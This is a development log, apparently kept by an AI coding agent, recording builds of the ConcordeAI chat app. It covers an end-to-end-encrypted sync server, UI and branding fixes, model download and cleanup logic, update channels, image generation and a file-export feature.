  and 512 MB would have forced the KDF cost DOWN, weakening the one
  thing the whole scheme exists to protect. Reserved IP
  129.212.150.83 so DNS survives a rebuild.
  sync.millertechnology.net, Cloudflare DNS-ONLY per Patrick: TLS
  terminates only on our box, so not even Cloudflare is a middlebox on
  a service whose pitch is "nobody can read this". Caddy + Let's
  Encrypt, auto-renewing.
- THE SHAPE (sync/concordeai_sync.py, stdlib only): the server cannot
  read a chat, and that is arithmetic rather than policy. The client
  derives auth_key and wrap_key from the password (PBKDF2-600k then
  HKDF, domain separated), makes an INDEPENDENT random data_key,
  encrypts the chats with it, and uploads data_key wrapped in
  wrap_key. The server holds email, a public salt, scrypt(auth_key),
  and two opaque blobs — no path to wrap_key, therefore no path to
  plaintext. That separate data_key is what makes a password change a
  re-WRAP rather than a re-encrypt, so chats never cross the server in
  the clear.
- DETAILS THAT MATTER: /v1/login-begin returns a convincing FAKE salt
  (HMAC of the email under the server secret) for unknown addresses,
  so it cannot be used to test who has an account; login hashes even
  for unknown users to flatten timing; sessions are stored only as an
  HMAC of the token; /v1/sync is optimistic-concurrency and hands the
  current copy back on 409 so the client merges instead of clobbering;
  rekey signs out OTHER devices but not the one doing it.
- THE BOX ITSELF: key-only SSH (passwords off), ufw 22/80/443 only,
  2 GB swap, unattended-upgrades, and the service as a nologin system
  user inside a systemd sandbox (ProtectSystem=strict, MemoryMax=350M)
  bound to 127.0.0.1 — Caddy is the only way in. NO ACCESS LOG ON
  DISK, deliberately: a service promising it cannot see your data
  should not keep a durable record of who connected and when either.
- BACKUPS: DAILY, not weekly — an account store whose contents nobody
  can reconstruct earns the extra $0.60/mo. And a DO snapshot alone is
  NOT enough: it images a running disk, and SQLite in WAL mode can be
  mid-transaction at that instant, so the restored file can be torn. A
  nightly systemd timer takes a consistent dump through SQLite's
  online backup API and keeps 14 days, so whatever the snapshot
  catches, a known-good copy sits beside it.
- A FALSE ALARM WORTH RECORDING: probing from this Mac showed backend
  port 8792 "open" to the world. It is not — ports 9999 and 31337
  answered identically with no banner while SSH returned a real one,
  so something in the local sandbox's network path accepts every SYN.
  `ss` reporting LISTEN 127.0.0.1:8792 is the authority (the kernel
  will not accept off-loopback packets for it), and ufw default-denies
  besides. Trust the listen address, not a connect().

## 6 beta 257 (cont.) — the reset that was not a flake
- A REFUSED POST WAS ANSWERING WITH A TCP RESET. The gauntlet's own
  admin-lockdown probe died twice with "Connection reset by peer"
  while reading a 403 body, and the first time it was written off as
  transient. It was not: _admin_gate answered without a Content-Length
  AND without draining the request body, so the socket still held the
  posted bytes when the handler closed — which the kernel turns into
  an RST, so the caller sees a network error instead of the tidy 403
  that was genuinely sent. The new CSRF gate had copied the same shape.
- One _refuse(code, err) now owns both paths: drain the body (bounded,
  64 KB at a time), send a Content-Length, write the JSON. Verified by
  hammering the exact probe six times — six clean 403s, body intact —
  where it had been resetting intermittently.
- The lesson generalises past this file: any handler that answers
  WITHOUT reading the request body must drain it first, or its
  refusal arrives as a network error rather than a refusal.

## 6 beta 258 (pending) — the Models pane stops being glitchy
- NO CHECKBOXES (per Patrick). Ticking boxes and then hunting for an
  Install button made the roster behave like a form; every row now
  carries a text action instead — "install" where "remove" sits on the
  other side — so both halves of the list read as one thing. The
  manual-install button and its note are gone with them.
- THE LIST SCROLLS, THE WINDOW DOESN'T. 20+ models stretched the
  dialog past the bottom of the screen, which is ALSO why Manage kept
  being unreachable: it lives under the roster, and the roster had no
  ceiling. #roster is max-height 230px with its own thin scrollbar.
- MANAGE, REBUILT. It opens with the inventory — "models installed:
  11 / 20" and "space taken: 75 GB", computed from the same
  /api/setup rows the roster draws, so the two can never disagree —
  then four honestly-labelled sizes:
    min   the lightest models, smallest footprint that still answers
    rec   ONE per family, newest generation: Gemma 4 instead of
          Gemma 2, no disk spent on superseded versions
    full  everything this machine's memory can actually run
    all   every model there is, INCLUDING ones too big for this Mac
  Only the last can hurt, so it wears a ⚠ and says what happens, and
  clicking it re-labels itself into a confirm rather than starting a
  1 TB download on one click. Measured here: min 2 models, rec 11,
  full 20, all 26 / 1063 GB — the spread is real, not decorative.
- FAMILY/GENERATION PARSING is the interesting part of "rec".
  _gen_of() reads the GENERATION out of a name and never the parameter
  count (any token ending in B is a size; "Phi-4" hands over its
  tail), and _family_of() splits by ROLE — a coder or a vision model
  is not an older sibling of the chat model, so it is never superseded
  by one. Checked against the real catalog: Gemma 4 26B beats Gemma 2
  9B, both Qwen coders stay their own family, LLaVA is "vision".
- RELEASE NOTES REFLOW (per Patrick: "looks sloppy"). A release body
  is hard-wrapped at ~72 columns because that is how git wants it, and
  #up-notes was rendering it white-space:pre-wrap — so every one of
  those breaks landed mid-sentence in a narrow pane. notesHTML() now
  rejoins paragraphs and keeps only the breaks that MEAN something (a
  blank line ends a paragraph, a leading "-" starts a list item, and a
  wrapped item folds back into itself). Verified against the real v257
  body: zero mid-sentence breaks, six list items, bold intact.
- Version holds at 6.1.0 beta by design (per Patrick): 6.1 proper
  ships when sign-on and cloud sync land, so cuts until then are build
  bumps inside 6.1.0 — use `./release.sh 6.1.0`, never `minor`.
- Gauntlet 111/111 (+3: roster actions/scroll, manage inventory +
  four sizes with the risky one warned, notes reflow).

## 6 beta 258 (cont.) — EXTRA extra bold, and the bar wears the lockup
- THE AI IS NOW AS BOLD AS THE VPN'S SECOND WORD (per Patrick), which
  is a real recipe rather than a heavier number: Michroma ships ONE
  weight, so a synthetic 700 barely moved the glyph. 800 PLUS a hair
  of -webkit-text-stroke fattens the actual outline, and that is
  exactly what the sibling app does. Applied to all three in-page
  lockups; the two door pages needed their own rule because they clip
  a GRADIENT to the text — their fill is transparent, so a
  currentColor stroke would have drawn precisely nothing. There the AI
  takes a solid bright silver of its own, which also makes it read as
  its own word against the moving ramp.
- THE TITLEBAR WEARS THE LOCKUP, MINUS THE GEAR (per Patrick: same
  look as the VPN app, but that app's settings button stays over
  there — settings live in this one's sidebar). A real
  NSTitlebarAccessoryViewController, not a hand-planted subview of the
  theme frame: accessories sit beside the traffic lights as first-class
  citizens and survive fullscreen, which the subview approach did not.
  The AI's weight there is a NEGATIVE NSStrokeWidth (-12), which means
  stroke AND fill — it thickens the glyph instead of outlining it.
- MICHROMA IS NOW BUNDLED (fonts/, SIL OFL, copied into
  Contents/Resources by build_macos_app.sh). The page can pull the
  webfont from Google; a native NSTextField in the titlebar cannot,
  and would have silently fallen back to the system face. Registered
  through CoreText by raw ctypes because the app's venv has no pyobjc
  CoreText module. Verified end to end in that venv: the font
  registers, NSFont resolves "Michroma", and the fat stroke lands on
  the AI run only.
- THE BRAND GUARD BIT ME, CORRECTLY. The first run failed because a
  CSS comment I had just written named the VPN app in full — and
  "Concorde" not followed by AI is exactly what the guard forbids in
  the page. Second time this build's own commentary has tripped it
  (the ">AI</span>" one was the first). Comments ship; write them as
  if they do.
- 6.1 RC1: APP_RC relabels every display surface from "beta" to
  "RC<n>" and titles the release the same, while KEEPING the
  prerelease hold — an RC is still not the stable build, so
  /releases/latest must not hand it to a stable install. NO build
  number rides along (per Patrick): an RC is NAMED, not numbered —
  "6.1 RC1", full stop — so check_update's build-appending suffix rule
  stays beta-only. The updater still compares the TAG's build, so a
  newer RC1 cut is offered correctly even though both read the same on
  screen. Set APP_RC = 0 when 6.1 ships for real, after sign-on and
  cloud sync.
- Gauntlet 115/115.

## 6 beta 259 (pending) — About leads, Account closes
- THE RAIL READS TOP TO BOTTOM AS A STORY NOW (per Patrick): About
  first — it is what people open the panel to see — then the settings
  proper, and Account last, because "who am I / sign out / erase
  everything" belongs at the foot rather than the front door. Updates
  is renamed About; the pane id moved with it (p-updates -> p-about)
  and the default-open class went with it too, so the panel opens on
  About instead of on the exits.
- NO DESCRIPTION LINE ON ABOUT (per Patrick). The version number sits
  directly under the title and says it better than a sentence could;
  five descriptions across six panes is the shape now, and the
  gauntlet counts exactly that so a stray one can't creep back in.
  The removed blurb is asserted absent by name for the same reason.
- The new order is checked structurally rather than by eyeball: the
  nav's data-pane list and the sections' id list must BOTH equal the
  intended order, so a future edit that moves one without the other
  fails loudly instead of silently desynchronising the panel.
- STANDING RULE FROM HERE (per Patrick): do NOT cut a release or touch
  APP_VERSION / APP_BUILD / APP_RC unless he asks. Build, test, commit,
  push — then stop and say it is ready to cut.
- Cut as 6.1 RC2 when he asked, one build later. Two things rode along:
  the DMG FILENAME is hyphenated now (ConcordeAI-6.1.0.dmg) because
  GitHub rewrites spaces to dots in asset names, which is why RC1's
  disk image landed as "ConcordeAI.6.1.0.dmg" while the zip and msi
  were already hyphenated — the volume LABEL keeps its space, being a
  human label rather than a filename. And the RC gauntlet check now
  matches any RC number instead of the literal 1, so it doesn't need
  hand-editing on every cut.

## Moved: the working folder now lives in Projects (2026-08-22)
- FROM `My Drive/Downloads/files` TO
  `My Drive/Projects/Concorde/ConcordeAI` (per Patrick). Same volume,
  so `mv` was a rename rather than a 189 MB copy — Drive re-uploads
  nothing and git is untouched: history, remote and a clean status all
  came across intact.
- Timed for the safest possible window: immediately after the v259 /
  6.1 RC2 cut, with the tree clean and no peer sessions left holding
  the directory open. A move with uncommitted work in flight, or with
  another session writing into the old path, is how a folder ends up
  half in each place.
- CLAUDE.md's gauntlet `cd` line was repointed. Older entries in THIS
  file still say `Downloads/files` and that is correct — they were
  true when written and the log is not rewritten; this entry is the
  forwarding address.
- Unaffected, because none of them ever referenced the repo path: the
  app's data lives in `~/Library/Application Support/MillenAI`, the
  live deployment is its own checkout at `~/Library/MillenAI-live/repo`
  (still the trap — never edit there), and every build script already
  used `cd "$(dirname "$0")"` rather than an absolute path.

## 6 beta 260 (pending) — the answers themselves, and a rig to keep them honest
- PATRICK'S TWO COMPLAINTS WERE THREE BUGS. "Chat gives useless
  answers" and "the funnel just parrots my choices back" turned out to
  be four separate causes, each fixed here, plus a fifth the new rig
  found within one batch.
- THE FUNNEL WAS ECHOING BECAUSE OF A ONE-LINE FALLBACK:
  `"summary": out or "\n".join(picks)`. When the summariser produced
  nothing, the "recommendation" was literally the user's own answers
  joined by newlines — exactly "something strawberry, frozen, with
  sprinkles". It never says that now: if no model can be reached it
  says so plainly and points at Settings.
- AND THE SUMMARISER WAS WEARING THE WRONG PROMPT. It ran under
  FUNNEL_SYS, whose entire job is "offer options that narrow the
  decision", then was asked for a single verdict — contradictory
  instructions, so it restated or re-offered. The verdict now has its
  own voice, FUNNEL_SUMMARY_SYS ("restating the user's answers back to
  them is failure"), with care mode carried across for tender
  decisions. Its model ladder widened from three hard-coded labels to
  MERGE_RANK, so a Mac without those exact three no longer falls
  through to the echo.
- THE STAGES HAD NO MEMORY OF THEIR OWN QUESTIONS. Only the ANSWERS
  were sent back, so the model happily asked "city or nature?" four
  times running, and ignored a typed "strawberry" to ask about texture
  again. Both ends now carry an `asked` list, paired with the answers
  ("asked X -> they answered Y"), and the prompt forbids repeating or
  re-asking what an answer already settles. Measured before/after on
  the same seed: 4 questions collapsing to 1-2 distinct -> 4 of 4
  distinct, and the candy funnel's second question became "what
  texture for your STRAWBERRY fix" — it finally hears the typed word.
- THE WEB VOICE WAS HEDGING BY INSTRUCTION. RESEARCH_WRITE said "using
  ONLY the numbered sources", and REVISE_INSTRUCTION said to "delete
  any named business the draft cannot vouch is real" — rules written
  against hallucination that also deleted every real, well-known place
  the model knew, leaving "there's a place, try it". Split the
  difference the way a good local would: volatile facts (hours,
  prices, open-now) stay source-bound and cited; stable knowledge is
  used freely and uncited; a non-answer is named as the worst outcome.
- SUPERMARKETS WERE UNREACHABLE. _OSM_KINDS only mapped amenity= tags,
  but a supermarket is shop=supermarket — so the one query type that
  prompted this whole round ("is there a supermarket open now") could
  never find a venue with real hours. The Overpass query is a union
  over amenity= and shop= now, and grocery/bodega/deli words route to
  it.
- THE RIG (drill.py + drill_rubric.md): fires real questions at a live
  instance across chat / web / funnel, walks funnels to completion
  with a MIX of clicked and TYPED answers, and records everything
  verbatim to ~/Library/Application Support/MillenAI/drill_runs (out
  of Drive on purpose — a days-long grind would sync thousands of
  files, and a write into a freshly-created Drive directory came back
  0 bytes in testing). It deliberately does NOT grade itself: the
  judge is Claude reading the transcript against the rubric, so the
  same code never both answers and marks its own work.
- IT EARNED ITS KEEP IMMEDIATELY. Batch one caught the repeated
  questions above, and batch two caught a live geography failure:
  "best pizza slice near myrtle-broadway, open now" — a Bushwick
  intersection — was answered with pizzerias in MYRTLE BEACH, SOUTH
  CAROLINA. The search planner doesn't pass the user's locality, so
  "myrtle" resolves to the famous place. That is the next fix, and it
  is written down rather than half-done at the end of a long session.


## 6 beta 264 (pending) — the app stops talking shop

(Numbering note: 6b261–263 are the drill-loop batches — locality,
nwr/ladder/cache-success, any-engine stage retry — recorded in
drill_ledger.md cycles 5–9. This entry is the UI pass that rode
alongside them. When the next build is cut it should carry
APP_BUILD ≥ 265 so the source tags stay truthful.)

- THE MACHINERY GOES BACKSTAGE (per Patrick: "we still don't really
  need to know what model is compositing. Make it clean for the
  average user"). Answer bubbles say the brand, not the compositor:
  the who-label is "you" or the app name, never a model id. The
  models pane still tells the whole truth — curiosity has a home,
  it's just not the chat transcript.
- THE MENU SAYS THE APP'S NAME. The macOS menu bar read "Python"
  because the process IS the venv python3 — CFBundleName comes from
  the interpreter's bundle. NSBundle.mainBundle().infoDictionary()
  is mutable before the first window; overriding CFBundleName /
  CFBundleDisplayName there renames the menu without a wrapper app.
- ONE WEIGHT FOR "AI" EVERYWHERE (per Patrick: "weight AI the same
  as both"). The extra-bold stroke was .55px/.6px — absolute px, so
  the titlebar lockup (small font) wore proportionally MORE stroke
  than the sidebar (large font). It's .12em currentColor now: same
  relative weight at every size, matching NSStrokeWidth -12 on the
  AppKit side.
- THE GLOW OVAL IS GONE (per Patrick: "get rid of that bubble/oval").
  The HDR glint's radial mask read as a pill floating behind the
  wordmark. Feature pulled — markup, CSS, and the hdrSync timer;
  /vfx/hdr-beacon.mp4 stays served for the future HDR-skies work.
- THE VERSION MOVES TO THE FOOT (per Patrick: "find a spot for the
  version number under the system monitor similar to the vpn.
  remove it from the top"). The lockup's vsub tag is gone; a quiet
  italic "Version 6.1 RC3" (#ver-foot) sits under the COMMUNITY GPU
  meter — the ConcordeVPN treatment. Gauntlet now asserts the foot
  exists AND the sidebar carries no vsub.

## 6 beta 265 (pending) — the trial run pays for itself

Patrick trialled the test build and each complaint traced to something
real (see also the drill entries in drill_ledger.md, cycles 10-11):

- THE STALE-PAGE 304 (committed as 1b79a1a): APP_BUILD holds still
  between releases by rule, so the build-only ETag told a WKWebView
  holding a weeks-old cached page "unchanged" — his test window
  re-served the glow-era UI for days. ETag now carries source mtime.
- THE TITLEBAR SAT 3PT LOW — always had. Centering used the label's
  own box height; Michroma carries more slack under its baseline than
  above its caps, and the accessory pins to the bottom of a bar taller
  than BARH. Measured on-screen (cap ink vs the traffic-light row) and
  corrected +2.5; the raised-AI line-box growth is now centered
  against a plain reference string so the lift can't sink it again.
- THE WING SAGGED once the text was right: box-centered, its ink hung
  4pt below the baseline. The sidebar is the approved reference —
  wing ink and cap ink share top AND bottom — so the titlebar wing is
  sized to cap height (ink fractions computed from the bezier) and
  lifted the same measured amount.
- THE OUT-OF-PLACE i: the version foot was italic MONO — the face has
  no italic, and the synthesized oblique at 10.5px detaches the i's
  dot into a floating speck. The foot now uses the system face (a real
  italic), the ConcordeVPN verline treatment.
- AUTO-CLEANUP (per Patrick: "checkbox or similar for auto cleanup to
  remove models that are no longer supported"). superseded_installed()
  names an installed model only when a NEWER generation of its family
  is ALSO complete on disk (the rec doctrine, never the only copy of
  anything); _remove_models() is the /api/model/remove body extracted
  verbatim so both paths share every guard; _auto_cleanup_pass()
  stands down during any download or app update and skips resident
  engines (port-probe, not just _mlx_procs — siblings own ports too);
  the janitor runs it 6-hourly, the Manage checkbox runs it on tick.
  On this Mac it names Llama 3.1 8B + Gemma 2 9B IT — 9.7 GB back.

## 6.1 RC4 — build 268

Cut on Patrick's word after twelve drill cycles and the trial-run
fixes. Build jumps 260 -> 268 so every 6b261-267 source tag lands
inside a shipped build. Ships: cycles 10-12's answer-quality edits
(locality nouns, listings commit, grounded + literally-pick-honoring
funnel verdicts, the weather ladder + honesty, the data-access meta
ban, the stage quality gate), the 6b264 UI pass (version at the
foot, one AI weight, no glow, brand-only labels, real menu name),
the 6b265 trial-run fixes (mtime ETag, titlebar truly centered,
system-italic foot, auto-cleanup), all gated 121-127/127 green.
Still a prerelease: APP_BETA holds, sync sign-in gates "6.1 proper".

## 6 beta 268-era (pending) — RC4 morning feedback

- ONE RECIPE FOR THE BOLD AI (per Patrick: "spacing between concord
  and the letter A is different... the bottom one not so much").
  Canvas glyph metrics proved page and titlebar spacing were ALREADY
  identical (E-to-A = 0.51 of a letter gap in both) — the visible
  difference was the page's synthetic font-weight:800: WebKit fakes
  bold as a horizontal double-strike, fattening the AI sideways in a
  way AppKit's pure negative-stroke never does. Every page lockup now
  uses the titlebar's exact recipe: regular weight + .12em stroke +
  .865em + .06em lift. Measure before tucking: the first fix was a
  -.08em margin that "corrected" a gap that was never wrong.
- THE MEMORY % IS GONE (per Patrick) — the bar carries the reading;
  label + meter only.
- CLEAN UP NOW (per Patrick: "a pop-up showing how much space will
  be freed... allow the user to clean them out right now"). A button
  under the auto-clean checkbox opens a veil naming each superseded
  model and the GB freed; Remove runs the same guarded sweep with
  force=true (skips only the pref gate, never the safety guards).
  The checkbox itself had already earned its keep: Patrick ticked it
  during the trial and the sweep freed 9.7 GB on the spot (Llama 3.1
  8B + Gemma 2 9B IT, both with newer family generations installed).

## 6 beta 269-era (pending) — the morning-after list

- THE PRUNE (per Patrick: "what models can we prune that are basically
  redundant or outdated"). Six catalog rows retired — Gemma 2 2B and
  9B (the Gemma 4 line), Llama 3.1 8B (3.2/3.3), Qwen 2.5 7B (3.6),
  the ollama-default "DeepSeek R1" (a duplicate of the R1 7B distill),
  Mistral Small 24B (squeezed between Gemma 4 26B and Nemo). Presets
  and the wizard's plans derive from the catalog, so they dropped out
  of every plan for free; the hardcoded tier/agent/funnel/remote
  ladders were scrubbed by hand (a grep for each label is the test).
  RETIRED_MODELS keeps their vetted repo/tag/port/GB so auto-clean
  still recognises and deletes their weights on any user's disk.
- THE WIZARD gets the auto-clean checkbox beside "ignore system
  limits" (per Patrick) — same pref, no button there.
- THE HERO GREETS YOU (per Patrick: "how Claude will say good evening
  Pat... how's Tokyo tonight, Pat?"). The 150 NYC lines are gone; the
  new bank is anywhere-on-earth, tokened with {name} (first word of
  the Settings name) and {city} (first segment of home_area), gated
  by hour/day/month as before, and NEVER asserts weather. A line
  needing a token the app lacks is never drawn.
- CHAT SEARCH under the lane tabs (per Patrick): titles filter as you
  type; from three characters /api/chats/search greps message content
  too, so an answer you remember finds its chat.
- TITLEBAR LOCKUP CENTERED (per Patrick, "similar to the VPN"):
  accessories only know left/right, so the left one spans the bar and
  the lockup container is parked on the window's midpoint, re-parked
  on resize/layout notifications by a tiny NSObject observer.
- REMOVE LINKS are manage-mode only (per Patrick): the roster reads
  as an informative list until Manage models opens.

## 6.0 — build 269 (the release)

Cut on Patrick's word: "sort the version numbers and push this as
version 6.0 and publish it." The 6.1 label was a mistake — the line
never left 6.0 — so APP_VERSION goes 6.1.0 -> 6.0.0, APP_RC 4 -> 0,
APP_BETA True -> False: a full release on the stable channel, build
269, and the 6.1-titled prereleases (v257-v260, v268) are retitled
"6.0 beta / RC1-4" on GitHub so the history reads straight. The
updater keys on build numbers only, so every install — beta, RC or
older stable — moves to 269 normally. Ships everything through
6b273 (the venue-clock fix, probe-verified from the Tokyo-set Mac).

## 6.0-era (pending) — the lockup that vanished

The centered-titlebar rewrite (6b269) referenced `_ww` seven lines
before it was computed; the NameError was swallowed by the chrome
block's catch-all and the lockup simply never got added — "the logo
vanished from the title bar" (per Patrick). Rebuilt: the wing +
wordmark view goes straight into the titlebar view (the traffic
lights' superview) with flexible left+right margins, so AppKit keeps
it on the window's midpoint through every resize — no wide accessory,
no notification observer. Measured on screen: ink center within 1.5
device px of the window's; wing and cap seats within 0.5 device px
of the bar's center. The gauntlet now asserts the define-before-use
order so this class of silent vanish can't recur.

## 6.0.1 — build 270

Cut on Patrick's word ("if we're good, then let's push this version
6.0.1") after an adversarial diff review of everything since v269 and
the full gauntlet. Ships 6b274-6b279: the describe-first verdict
audit (and the bare-% crash that killed every verdict in unreleased
builds — 6.0 itself never had it), the fallback stage, closed-means-
closed with closure searches and "listed, unverified" own-site hours,
the venue clock with the home area as default, the nine-day weekend,
dated headline facts, listings-site search, the arithmetic and
invented-precision rules, the centered titlebar lockup (rebuilt after
the use-before-define vanish), and a gauntlet that walks a real
funnel to its verdict on every run.

## 6.0.x (pending) — the post-update moment

The full-screen version zoom after an update is retired (per Patrick:
"a more professional looking pop up saying it's been updated and show
a little scroll box of the release notes"). maybe_version_splash keeps
its last_version bookkeeping but only records that an update landed;
the page shows #updated-veil once — "Updated to X · You were on Y" —
with the release body from /api/update/check in a scrolling box, the
same text the Updates pane shows. Queued for the next cut.

## 6.0.2 — build 271

Cut on Patrick's word ("push the update for the cleanup now and
expanded window... make it version 6.0.2"). Ships 6b281-6b283: the
home clock on every request, thin-list scoping, numeric walls in
verdicts, the post-update dialog, and the bounded settings grid that
finally shows the Clean-up row.

## 6b285 — three channels: stable, beta, nightly (uncut)

Per Patrick ("split this up so we now have the stable release, the
beta release, and the nightly releases… nightly releases flagged with
a commit number… when it's pretty clean, I'll tell you to commit it to
the beta and then eventually stable"), and the scheme he gave the VPN
session so the site parses both apps the same way.

- Nightly = ONE rolling GitHub prerelease, tag `nightly`, rebuilt by
  `.github/workflows/nightly.yml` on every push to main (macos-latest,
  no laptop needed). Title `<short-version> nightly <sha7>`; body line 1
  `ConcordeAI <short-version> nightly <sha7>` then one bullet per
  commit since the previous nightly. The release and tag are deleted
  and recreated, never edited, so published_at moves.
- CI stamps `APP_NIGHTLY = "<run> <sha7>"`; `short_version()` then reads
  "6.0.2 nightly a1b2c3d" on every surface. Beta/stable builds carry an
  empty constant and show no commit.
- `update_channel()` pref (stable / beta / nightly; legacy
  `beta_updates` still maps to beta). `_channel_release()` picks by
  channel: nightly = the `nightly` tag, newer when its SHA differs from
  ours; beta = newest prerelease that is not the nightly; stable =
  /releases/latest. Update-check cache is keyed per channel.
- Settings → About: a channel <select> replaces the beta checkbox and
  re-checks on change. The version line leaves the main window (the
  sidebar foot is gone); it lives at the top of Settings only.
- MSI workflow skips the `nightly` tag.
- Rollback: tag `pre-channels` (0b07e85). Revert, delete the workflow,
  `gh release delete nightly --cleanup-tag`.

## 6b286 — betas numbered per line, the macOS way (uncut)

Per Patrick ("number the betas once they're committed and start with
1… like Apple does with macOS… we don't need beta 26"). APP_BETA is
now the small counter (0 = not a beta), never the build number:
"6.1 beta 1", "6.1 beta 2"… restarting at 1 with each new version line,
nine at most. `./release.sh beta 6.1.0` opens a line at beta 1;
`./release.sh beta` cuts the next; `./release.sh rc` moves the line to
RC1, RC2…; `./release.sh 6.1.0` (or patch/minor/major) ships stable and
clears the hold. release.sh stamps APP_BETA/APP_RC itself and names the
commit and the GitHub title by the same label. Nightlies keep rolling
on every push and never touch the counter.

## 6b287 — the disk image tells the truth, in the wordmark's face (uncut)

Per Patrick (screenshot of the nightly DMG reading "6.0.2"): the DMG
window title and the line under the mark now carry the app's own
label — "6.0.3 nightly 7a23650", "6.1 beta 2", "6.1 RC1" — mirrored in
build_dmg.sh from the same constants CI stamps before building. The
filename stays ConcordeAI-<raw version>.dmg (the site and the updater
read it). The wordmark is set in the bundled Michroma (fonts/) with the
app's exact AI recipe instead of the old Helvetica stand-in. Working
version moved to 6.0.3: 6.0.2 has shipped, so nightlies run ahead of
it; `./release.sh beta 6.0.3` opens that line at beta 1.

## 6b288 — a provider's error notice is never the answer; the update moment knows a nightly (uncut)

Per Patrick (screenshot: "The API key used for this request has
reached its budget…" shown as the reply to "How fast can electric cars
actually go?", sources and all — "major bug… the user should always
get an answer"). Some endpoints return the failure as a 200 with the
notice in the content field, so the HTTP-error paths never saw it.
`_is_provider_error()` recognises short key/budget/quota/billing
notices; the free tier rests an hour and returns False, keyed
providers rest an hour via `_cloud_budget_hit()` and return "", and
the streaming path holds the first ~240 characters so a notice never
reaches the reader — every rung then falls through to the next, down
to local silicon. Post-update dialog: the identity compared is
short_version(), so a nightly with a new commit is an update ("just
another 6.0.3 nightly, with an updated commit number"); notes come
from the new /api/update/whatsnew — the nightly release body when its
commit is ours, else GitHub's compare between the previous identity
and our commit; numbered releases read their own tag's body. Test and
dev instances never move the shared last_ident record.

## 6.0.3 — build 272

Cut on Patrick's word ("cut this as 6.0.3 stable. future nightlies are
for 6.0.4"). Ships 6b285-6b288: three channels, numbered betas, the
truthful disk image in Michroma, the provider-notice fallback, and the
nightly-aware post-update card. Working line moves to 6.0.4; nightlies
run ahead on it.

## 6b290 — model downloads that tell the truth (uncut)

Per Patrick (Recommended preset "sitting at 100% doing nothing… idiot
proof it"). Root cause: `_downloaded_bytes` counted the first-run
STARTER set only — every starter was already on disk, so a preset that
added other models read 100% with no speed while eleven downloads ran
unseen. Now `_batch_labels()` = every model queued this session. Also:
the stall watchdog judged MLX jobs by a pct they never carry (every
download over ten minutes was branded "stalled"); it now watches bytes
on disk. MLX downloads run two at a time (`_MLX_GATE`), the rest wait
as "queued". `/api/setup` adds `now` (moving models + pct), `queued_n`
and `plan_state` (current / installed / partial / none per preset);
the install route reports what it started and what was already here.
UI: the download dialog names what is moving; the Manage pane ticks
every two seconds until the batch is done ("downloading — 12.1 of 24.4
GB · 49% · 38 MB/s · Gemma 4 12B 61%, Qwen 3 8B 20% · 6 waiting"),
says "already installed — nothing to download" when there is nothing
to do, and lists failures with a retry hint; the preset exactly on disk
wears a "✓ current" badge and a firm edge.

## 6b291 — one download indicator (uncut)

Per Patrick ("here we go again", screenshot: the sidebar pill reading
"DOWNLOADING MODELS · 52%" over a strip reading "models · 53% · 13.9
MB/s"). Two pollers painted two surfaces that disagreed, and the pill
faked a bar with a hard gradient split under its text. Now the strip
alone speaks while anything downloads ("downloading models · 52% ·
13.9 MB/s · ~4 min"), the pill hides, and one read drives both. The
pill's own poller only runs when nothing is downloading.

## 6b292 — visual effects, the cog, and update checks by choice (uncut)

Per Patrick. (1) "Performance mode" leaves the sidebar and becomes
"Enable visual effects" in Settings › About under the update settings.
(2) It now touches ONE thing: the moving backdrop (`body.novideo` hides
#skyline, solid composer and sidebar). Spinners, halos, theatre, message
animations and telemetry no longer care; the eleven other body.perf
rules are gone and the body:not(.perf) rules are unconditional. The old
localStorage key migrates (perf on -> video off). (3) The settings cog
moves into the brand row, left of the new-chat pen. (4) "Check for
updates automatically" switch (pref `auto_update_check`, default on):
on = at launch and daily (was hourly); off = only the button asks —
the server answers automatic calls with an honest "off", uncached, and
the About pane says so.

## 6b293 — tests never spend cloud quota (uncut)

Per Patrick ("why are we hitting quotas when we're not even running
queries?"). Two causes, both mine: the gauntlet's live-generation
section fanned every question out to all four providers, and the dev
instance shared cloud.json with the real app, so its ten-minute rests
showed in his Settings. Now the gauntlet parks Turbo for the whole
live section (restored at exit), and any instance not on 8889/9889
works from a private copy of the provider file seeded with the real
keys at boot — its rests never reach the app a person is looking at.

## 6b294 — image generation; the update pill is an arrow (uncut)

Per Patrick ("add image generation capability… cleanly integrate that
into the model settings… a smaller box under the presets… also in the
first start wizard"; "replace the missized update button… an up arrow
icon only"). "Generate an image of a cat" used to earn four paragraphs
describing a cat. Now `image_intent()` catches the ask before the web
search and `generate_image()` paints: FLUX.1 schnell, pre-quantised
4-bit for MLX (dhairyashil/FLUX.1-schnell-mflux-4bit, 9.6 GB), driven
by mflux in its OWN venv (venv-image — its mlx pins never touch the
chat engine); then a Gemini key (gemini-2.5-flash-image); then the
community cloud; and when nothing can paint, the reply says where to
add it. Pictures land in app_dir/images and are served at
/api/image/<id>.png; the markdown renderer draws our own images.
Manage models grows an "Image generation" box under the presets with
one button; the wizard's model step grows a checkbox; the install
rides the same strip and pane as model downloads (IMAGE_ROW). Apple
Silicon only for the local engine. The UPDATE pill is a 26px arrow.

## 6b295 — export, to twenty formats, routed from plain language (uncut)

Per Patrick ("add export for all the following formats … performed
intelligently, so that if the user asks 'can I export a mermaid file of
this', then it knows exactly which engine to go to … a small box with a
download link similar to how Claude presents downloads"). Designed by a
seven-dimension workflow, each design then attacked by an adversarial
verifier that TESTED claims rather than trusting them — which caught two
shipping blockers, a missing `import html`, a stored-XSS vector and a
download path that silently does nothing.

- ROUTER. `export_intent()` anchors on the FORMAT WORD, not a leading
  verb (image_intent's `^verb` shape misses "…as a PDF"), scores the
  frame around it, and needs 3 to fire. Absolute vetoes kill "what is a
  PDF" and "write a python script that makes a PDF"; soft vetoes yield to
  an explicit `as a <fmt>` frame. A filename only counts with a naming
  cue, so "the error in Main.java" is not an export. 38/38 on a corpus
  that includes every case the verifiers flagged.
- TWO LANES. "export this as X" converts the previous answer and returns
  early; "make me a PDF guide" shapes the answer first (via
  `dated_system`, never `messages[-1]` — the /search path replaces that
  message wholesale) and exports what was written.
- ENGINES, one per KIND not per format: doc (reportlab / python-docx),
  slides (python-pptx), table (openpyxl with real Excel charts, formula
  validation, and negatives that stay numeric), calendar (hand-rolled RFC
  5545 with octet folding and day-after DTEND), cards, archive, text.
  Mermaid gets synthetic ids and quoted labels, because multi-word
  labels are not legal bare node ids.
- DELIVERY. Files sit under the same per-identity base as chats, so the
  existing tenancy boundary covers them. Ids are token_urlsafe(16); the
  sidecar is `.meta`, not `.json`, which would collide with a JSON
  export. Every download is application/octet-stream + attachment +
  nosniff, never the format's own MIME — model-authored HTML served as
  text/html from our origin is stored XSS against the app. Filenames use
  RFC 6266 so a CJK name cannot blow up latin-1 header encoding.
